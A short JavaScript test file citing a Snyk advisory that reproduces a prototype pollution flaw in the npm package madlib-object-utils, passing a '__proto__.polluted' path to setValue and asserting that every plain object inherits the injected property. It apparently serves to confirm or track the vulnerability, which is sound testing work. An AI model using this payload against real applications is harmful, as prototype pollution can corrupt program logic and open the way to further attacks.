//https://snyk.io/vuln/SNYK-JS-MADLIBOBJECTUTILS-598676
test("prototype pollution in madlib-object-utils", () => {
  expect({}.polluted).toBe(undefined);

  const objectUtils = require("madlib-object-utils");
  objectUtils.setValue("__proto__.polluted", {}, "yes");

  expect({}.polluted).toBe("yes");
});
